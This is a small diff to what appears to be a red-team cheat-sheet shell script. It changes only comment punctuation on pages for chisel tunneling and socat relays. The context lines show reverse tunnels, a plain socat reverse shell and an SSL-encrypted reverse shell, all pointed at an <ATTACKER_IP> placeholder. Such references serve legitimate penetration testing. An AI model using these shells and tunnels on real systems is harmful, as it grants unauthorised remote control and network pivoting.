@@ -137,14 +137,14 @@ _red_chisel() { show_page "Chisel — Fast TCP/UDP Tunneling" \
     # On attacker (server):
     chisel server -p 8888 --reverse
 
-    # On target — forward target's 192.168.1.5:80 to attacker's :8080
+    # On target: forward target's 192.168.1.5:80 to attacker's :8080
     chisel client <ATTACKER_IP>:8888 R:8080:192.168.1.5:80
 
   REMOTE PORT FORWARD
     # On attacker (server, no --reverse)
     chisel server -p 8888
 
-    # On target — expose attacker's 8080 to target's 0.0.0.0:3000
+    # On target: expose attacker's 8080 to target's 0.0.0.0:3000
     chisel client <ATTACKER_IP>:8888 3000:127.0.0.1:8080
 
   COMBINED TUNNEL (multiple ports)
@@ -212,13 +212,13 @@ _red_socat() { show_page "Socat — Socket Relay" \
     socat TCP:<ATTACKER_IP>:4444 EXEC:/bin/bash
 
   SSL ENCRYPTED SHELL
-    # Attacker — generate cert and listen
+    # Attacker: generate cert and listen
     openssl req -newkey rsa:2048 -x509 -keyout key.pem \\
       -out cert.pem -days 30 -nodes
     socat OPENSSL-LISTEN:4444,cert=cert.pem,key=key.pem,\\
       verify=0 FILE:\\`tty\\`,raw,echo=0
 
-    # Target — connect
+    # Target: connect
     socat OPENSSL:<IP>:4444,verify=0 EXEC:/bin/bash
 
   UDP TUNNEL
